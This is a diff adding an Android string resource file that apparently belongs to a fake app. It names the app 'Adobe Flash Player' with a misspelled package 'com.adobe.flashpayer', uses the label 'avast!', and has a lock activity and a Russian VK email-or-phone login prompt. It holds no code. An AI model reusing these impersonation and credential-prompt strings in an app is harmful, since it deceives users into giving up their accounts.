@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Adobe Flash Player</string>
+    <string name="action_settings">avast!</string>
+    <string name="title_activity_lock_z">com.adobe.flashpayer</string>
+    <string name="mail_or_login_vk">Email или телефон</string>
+</resources>
